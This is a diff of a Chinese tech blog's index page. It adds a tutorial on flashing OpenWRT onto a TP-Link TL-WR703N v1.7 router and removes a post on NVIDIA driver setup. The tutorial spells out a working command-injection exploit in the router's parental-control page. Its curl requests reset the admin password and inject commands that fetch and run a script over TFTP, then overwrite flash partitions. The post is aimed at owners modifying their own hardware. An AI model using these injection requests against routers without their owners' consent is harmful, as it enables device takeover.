@@ -314,6 +314,187 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://huangwang.github.io/2018/12/31/TL-WR703N%E7%89%88%E6%9C%ACv1-7%E5%88%B7openwrt%E6%95%99%E7%A8%8B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Jack Huang">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Jack Huang's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/12/31/TL-WR703N%E7%89%88%E6%9C%ACv1-7%E5%88%B7openwrt%E6%95%99%E7%A8%8B/" itemprop="url">
+                  TL-WR703N版本v1.7刷openwrt教程
+                </a>
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2018-12-31 11:49:39 / 修改时间：13:15:10" itemprop="dateCreated datePublished" datetime="2018-12-31T11:49:39+08:00">2018-12-31</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>我的TL-WR703N路由器运行不稳定，就准备尝试刷最新的OpenWRT，看看能否好一点。</p>
+<h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><ul>
+<li>一个 TP-Link TL-WR703N 路由器，确保固件版本为 3.17.1 Build 140120 Rel.56593n<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># 在刷机之前，按reset按钮重置路由器</span><br></pre></td></tr></table></figure></li>
+<li>TL-WR703N 的 openwrt 固件 openwrt-ar71xx-generic-tl-wr703n-v1-squashfs-factory.bin<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 下载openwrt固件并拆分成两份（因为wr703n的内存很小，可能传输的时候传不了整个文件）</span><br><span class="line">curl https:&#x2F;&#x2F;downloads.openwrt.org&#x2F;snapshots&#x2F;trunk&#x2F;ar71xx&#x2F;generic&#x2F;openwrt-ar71xx-generic-tl-wr703n-v1-squashfs-factory.bin -o openwrt-ar71xx-generic-tl-wr703n-v1-squashfs-factory.bin</span><br><span class="line">dd if&#x3D;openwrt-ar71xx-generic-tl-wr703n-v1-squashfs-factory.bin of&#x3D;i1 bs&#x3D;1 count&#x3D;1048576</span><br><span class="line">dd if&#x3D;openwrt-ar71xx-generic-tl-wr703n-v1-squashfs-factory.bin of&#x3D;i2 bs&#x3D;1 skip&#x3D;1048576</span><br></pre></td></tr></table></figure></li>
+<li>TFTP 服务器<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 安装TFTP的客户端和服务器端</span><br><span class="line">sudo apt-get install atftp atftpd</span><br></pre></td></tr></table></figure></li>
+<li>busybox 1.16.1 MIPS 版<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https:&#x2F;&#x2F;busybox.net&#x2F;downloads&#x2F;binaries&#x2F;1.21.1&#x2F;busybox-mips &gt; busybox</span><br></pre></td></tr></table></figure></li>
+<li>编写Hack脚本<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;tmp</span><br><span class="line">tftp -gl i1 192.168.1.100 # 把i1从tftp服务器下载下来，这里的ip应该是，你的tftp服务器连接路由器之后，ifconfig看到的ip</span><br><span class="line">tftp -gl i2 192.168.1.100 # 把i2从tftp服务器下载下来</span><br><span class="line">tftp -gl busybox 192.168.1.100 # 把busybox从tftp服务器下载下来</span><br><span class="line">chmod 755 busybox  # 修改busybox权限以执行命令</span><br><span class="line">.&#x2F;busybox dd if&#x3D;i1 of&#x3D;&#x2F;dev&#x2F;mtdblock1 conv&#x3D;fsync # 将i1写入磁盘分区</span><br><span class="line">.&#x2F;busybox dd if&#x3D;i2 of&#x3D;&#x2F;dev&#x2F;mtdblock2 conv&#x3D;fsync # 将i2写入磁盘分区</span><br><span class="line">reboot -f # 重启，会启动openwrt</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h1 id="刷机流程"><a href="#刷机流程" class="headerlink" title="刷机流程"></a>刷机流程</h1><p>在V1.7以前，可以通过路由器的Web UI直接将openwrt刷到板子上，但在V1.7之后，只能通过利用TP-LINK家长控制的漏洞，让路由板执行一些代码，成功刷写openwrt系统。本教程就是利用TP-LINK家长控制的漏洞进行openwrt刷机。下面介绍openwrt刷机的步骤。</p>
+<h2 id="搭建tftp服务器"><a href="#搭建tftp服务器" class="headerlink" title="搭建tftp服务器"></a>搭建tftp服务器</h2><p>在Debian操作系统中搭建tftp服务器请参考链接4。将busybox、 拆开的固件i1和i2、Hack脚本aa放入tftp服务器目录。</p>
+<h2 id="Hack-into-TL-WR703N"><a href="#Hack-into-TL-WR703N" class="headerlink" title="Hack into TL-WR703N"></a>Hack into TL-WR703N</h2><p>这个方法是利用TPLINK家长控制漏洞，以curl的方式执行命令，让路由器从tftp服务器上下载脚本，执行命令，从而将openwrt固件写入路由器。</p>
+<blockquote>
+<p>【警告】以下步骤可能导致你的路由器变砖，请确认当前的路由器固件版本是3.17.1 Build 140120. 下述全过程请勿断开连接或是断开电源，本人不对产生的任何后果负责！另外，每一步都很重要，别忽略其中任何一步。一旦变砖，请用3.3V的串口线抢救。</p>
+</blockquote>
+<p>步骤如下：</p>
+<ul>
+<li><p>长按reboot按钮将路由器恢复出厂设置</p>
+</li>
+<li><p>将tftp服务器通过WiFi的方式连接到路由器 TL-WR703N，ifconfig记住tftp服务器的ip，我的是192.168.1.100</p>
+</li>
+<li><p>在tftp服务器上执行如下命令修改路由器WebUI默认管理员密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 此处修改密码为admin42，注意Cookies中认证变量Authorization&#x3D;Basic%20YWRtaW46YWRtaW40Mg%3D%3D即是设置管理员密码为admin42。后续将继续使用该变量进行其他操作，如果认证变量不正确，操作将无法执行。</span><br><span class="line">curl -o - -b &#39;tLargeScreenP&#x3D;1; subType&#x3D;pcSub; Authorization&#x3D;Basic%20YWRtaW46YWRtaW40Mg%3D%3D; ChgPwdSubTag&#x3D;true&#39; &#39;http:&#x2F;&#x2F;192.168.1.1&#x2F;&#39;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>启用家长控制（利用漏洞）</p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -o - -b &#39;tLargeScreenP&#x3D;1; subType&#x3D;pcSub; Authorization&#x3D;Basic%20YWRtaW46YWRtaW40Mg%3D%3D; ChgPwdSubTag&#x3D;&#39; --referer &#39;http:&#x2F;&#x2F;192.168.1.1&#x2F;userRpm&#x2F;ParentCtrlRpm.htm&#39; &#39;http:&#x2F;&#x2F;192.168.1.1&#x2F;userRpm&#x2F;ParentCtrlRpm.htm?ctrl_enable&#x3D;1&amp;parent_mac_addr&#x3D;00-00-00-00-00-02&amp;Page&#x3D;1&#39;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>让路由器从tftp服务器下载并执行脚本<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 执行下述命令后，等待大约三分钟，路由器会重启进入openwrt系统，状态灯会闪烁一会儿</span><br><span class="line">curl -o - -b &#39;tLargeScreenP&#x3D;1; subType&#x3D;pcSub; Authorization&#x3D;Basic%20YWRtaW46YWRtaW40Mg%3D%3D; ChgPwdSubTag&#x3D;&#39; --referer &#39;http:&#x2F;&#x2F;192.168.1.1&#x2F;userRpm&#x2F;ParentCtrlRpm.htm?Modify&#x3D;0&amp;Page&#x3D;1&#39; &#39;http:&#x2F;&#x2F;192.168.1.1&#x2F;userRpm&#x2F;ParentCtrlRpm.htm?child_mac&#x3D;00-00-00-00-00-01&amp;lan_lists&#x3D;888&amp;url_comment&#x3D;test&amp;url_0&#x3D;;cd%20&#x2F;tmp;&amp;url_1&#x3D;;tftp%20-gl%20aa%20192.168.1.100;&amp;url_2&#x3D;;sh%20aa;&amp;url_3&#x3D;&amp;url_4&#x3D;&amp;url_5&#x3D;&amp;url_6&#x3D;&amp;url_7&#x3D;&amp;scheds_lists&#x3D;255&amp;enable&#x3D;1&amp;Changed&#x3D;1&amp;SelIndex&#x3D;0&amp;Page&#x3D;1&amp;rule_mode&#x3D;0&amp;Save&#x3D;%B1%A3+%B4%E6&#39;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h1 id="openwrt系统配置"><a href="#openwrt系统配置" class="headerlink" title="openwrt系统配置"></a>openwrt系统配置</h1><p>openwrt默认使用LuCI 用户界面，具体配置方法暂时没有时间研究。</p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
+<li><a href="https://cubicpill.me/2018/03/17/wr703n-openwrt.html" target="_blank" rel="noopener">给 v1.7 版本的 TL-WR703N 刷 openwrt</a>,by Cubic Zone.</li>
+<li><a href="https://juejin.im/entry/5a2f92df6fb9a0450d110c14" target="_blank" rel="noopener">TL-WR703N v1.7刷openwrt</a>,by 梦里茶.</li>
+<li><a href="https://openwrt.org/toh/tp-link/tl-wr703n" target="_blank" rel="noopener">TP-Link TL-WR703N</a>,by openwrt.</li>
+<li><a href="https://huangwang.github.io/2018/12/30/Debian安装配置使用TFTP/">Debian安装配置使用TFTP</a>,by jack huang.</li>
+</ol>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://huangwang.github.io/2018/12/30/Debian%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E4%BD%BF%E7%94%A8TFTP/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1928,177 +2109,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://huangwang.github.io/2018/12/10/Debian%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85NVIDIA%E9%A9%B1%E5%8A%A8%E6%94%AF%E6%8C%81%E5%8F%8C%E6%98%BE%E5%8D%A1%E5%88%87%E6%8D%A2/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Jack Huang">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Jack Huang's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/12/10/Debian%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85NVIDIA%E9%A9%B1%E5%8A%A8%E6%94%AF%E6%8C%81%E5%8F%8C%E6%98%BE%E5%8D%A1%E5%88%87%E6%8D%A2/" itemprop="url">
-                  Debian系统安装NVIDIA驱动支持双显卡切换
-                </a>
-              
-            
-          </h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2018-12-10 20:27:27 / 修改时间：21:36:51" itemprop="dateCreated datePublished" datetime="2018-12-10T20:27:27+08:00">2018-12-10</time>
-            
-
-            
-              
-
-              
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>购买笔记本拥有Intel集成显卡和NVIDIA显卡，如何在Debian Linux下启用NVIDIA显卡是一个难题。幸运的是，通过bumblebee软件可在Linux下支持NVIDIA Optimus技术，实现Intel集成显卡和NVIDIA显卡之间的切换使用。</p>
-<h1 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h1><h2 id="NVIDIA-Optimus"><a href="#NVIDIA-Optimus" class="headerlink" title="NVIDIA Optimus"></a>NVIDIA Optimus</h2><p>Optimus是NVIDIA针对笔记本电脑的显示切换技术。它可以实现笔记本电脑中独立显卡与主板内置显卡之间无缝、自动、实时的切换（用户无需重启或手动调整），从而实现能源的节约。</p>
-<p>利用Optimus技术后，计算机的显示输出永远都只会通过集成式芯片组的显示核心。独立显卡的显示输出将会被废掉，有关的输出亦会发送到前者。由于显示输出的设备是固定的，所以黑屏现象将会被解决。额外的切换线路亦变得不需要，因为在不需要独立显示核心的时候，系统会索性断绝其电源供应。当系统的显示负载轻的时候，就会完全利用内置的显示核心。当负载增加后，系统就会打开独立显示核心作计算之用。协议分工方面由驱动程序负责，NVIDIA声称可以兼容所有的API。</p>
-<h2 id="Bumblebee"><a href="#Bumblebee" class="headerlink" title="Bumblebee"></a>Bumblebee</h2><p>Bumblebee 致力于使 NVIDIA Optimus 在 GNU/Linux 系统上可用，实现两块不同的供电配置的显卡同时插入使用，共享同一个 framebuffer。</p>
-<h1 id="安装配置过程"><a href="#安装配置过程" class="headerlink" title="安装配置过程"></a>安装配置过程</h1><h2 id="禁止加载开源驱动nouveau"><a href="#禁止加载开源驱动nouveau" class="headerlink" title="禁止加载开源驱动nouveau"></a>禁止加载开源驱动nouveau</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ vi &#x2F;etc&#x2F;modprobe.d&#x2F;nvidia-installer-disable-nouveau.conf</span><br><span class="line"></span><br><span class="line">#上述文件不存在则新建，在文件中添加下面两行文字</span><br><span class="line">blacklist nouveau</span><br><span class="line">options nouveau modeset &#x3D; 0</span><br><span class="line"></span><br><span class="line">#系统重启后使用以下命令查看nouveau驱动是否被禁止</span><br><span class="line">lsmod |grep -i nouveau</span><br></pre></td></tr></table></figure>
-
-<h2 id="安装内核头文件"><a href="#安装内核头文件" class="headerlink" title="安装内核头文件"></a>安装内核头文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install -y linux-headers-$(uname -r)</span><br></pre></td></tr></table></figure>
-
-<h2 id="安装NVIDIA驱动"><a href="#安装NVIDIA驱动" class="headerlink" title="安装NVIDIA驱动"></a>安装NVIDIA驱动</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 关于是否生存xorg.conf文件，选no</span><br><span class="line">$ sudo apt-get install  nvidia-driver nvidia-xconfig nvidia-kernel-dkms</span><br></pre></td></tr></table></figure>
-
-<h2 id="安装双显卡切换解决方案包"><a href="#安装双显卡切换解决方案包" class="headerlink" title="安装双显卡切换解决方案包"></a>安装双显卡切换解决方案包</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ apt-get install bumblebee-nvidia primus</span><br></pre></td></tr></table></figure>
-
-<h2 id="添加当前用户到bumblebee用户组"><a href="#添加当前用户到bumblebee用户组" class="headerlink" title="添加当前用户到bumblebee用户组"></a>添加当前用户到bumblebee用户组</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ adduser $USER bumblebee</span><br></pre></td></tr></table></figure>
-
-<h2 id="修改bumblebee配置"><a href="#修改bumblebee配置" class="headerlink" title="修改bumblebee配置"></a>修改bumblebee配置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ vi &#x2F;etc&#x2F;bumeblebee&#x2F;bumblebee.conf</span><br><span class="line">: Driver&#x3D;nvidia</span><br><span class="line"></span><br><span class="line">#将&#x2F;etc&#x2F;bumeblebee&#x2F;bumblebee.conf文件中的Driver&#x3D;* 改成 &#x3D;nvidia</span><br><span class="line"></span><br><span class="line">$ vi &#x2F;etc&#x2F;bumblebee&#x2F;xorg.conf.nvidia</span><br><span class="line">:BusID &quot;PCI:01:00:0&quot; </span><br><span class="line"></span><br><span class="line">#在&#x2F;etc&#x2F;bumblebee&#x2F;xorg.conf.nvidia文件中，将Section“Device”部分添加PCI ID</span><br><span class="line"></span><br><span class="line"># 可使用如下命令查看NVIDIA显卡的BUS ID</span><br><span class="line">nvidia-xconfig --query-gpu-info | grep &#39;BusID : &#39; | cut -d &#39; &#39; -f6</span><br></pre></td></tr></table></figure>
-
-<h2 id="重启进入桌面"><a href="#重启进入桌面" class="headerlink" title="重启进入桌面"></a>重启进入桌面</h2><p>如果无法进入桌面环境，则安装失败，进入高级修复使用如下命令进行清理。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get purge nvidia* bumblebee* prime*</span><br></pre></td></tr></table></figure>
-
-<p>bumblebee服务开机不会启动，设置开机启动即可。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ update-rc.d -f bumblebee defaults</span><br></pre></td></tr></table></figure>
-
-<h1 id="使用独显运行程序"><a href="#使用独显运行程序" class="headerlink" title="使用独显运行程序"></a>使用独显运行程序</h1><p>bumblebee不能做到集显和独显之间自动切换，系统运行时默认使用集显，当你需要使用独显运行某个程序或者游戏的时候，终端执行如下命令即可：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ optirum command #使用独显运行command程序</span><br><span class="line">$ optirum -b primus command #使用独显运行command程序，提升性能</span><br></pre></td></tr></table></figure>
-
-<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
-<li><a href="https://zhuanlan.zhihu.com/p/37252268" target="_blank" rel="noopener">kali 在支持双显卡切换机器宏碁（Acer）V3下安装NVIDIA驱动</a>, by 不梦君.</li>
-<li><a href="https://github.com/europa502/Installing-Nvidia-drivers-on-Kali-Linux" target="_blank" rel="noopener">Installing-Nvidia-drivers-on-Kali-Linux</a>, by europa502.</li>
-<li><a href="https://zh.wikipedia.org/wiki/NVIDIA_Optimus" target="_blank" rel="noopener">NVIDIA Optimus</a>, by wikipedia.</li>
-<li><a href="https://linux.cn/article-3946-1.html" target="_blank" rel="noopener">在Ubuntu上安装和配置Nvidia Optimus驱动</a>, by Linux中国.</li>
-<li><a href="https://wiki.archlinux.org/index.php/Bumblebee(简体中文)" target="_blank" rel="noopener">Bumblebee</a>,by archlinux.</li>
-</ol>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2146,7 +2156,7 @@
                 
                   <a href="/archives/%20%7C%7C%20archive">
                 
-                    <span class="site-state-item-count">291</span>
+                    <span class="site-state-item-count">292</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
@@ -2859,9 +2869,9 @@
       
     
       
-        
-      
     
+      
+        
       
     
   
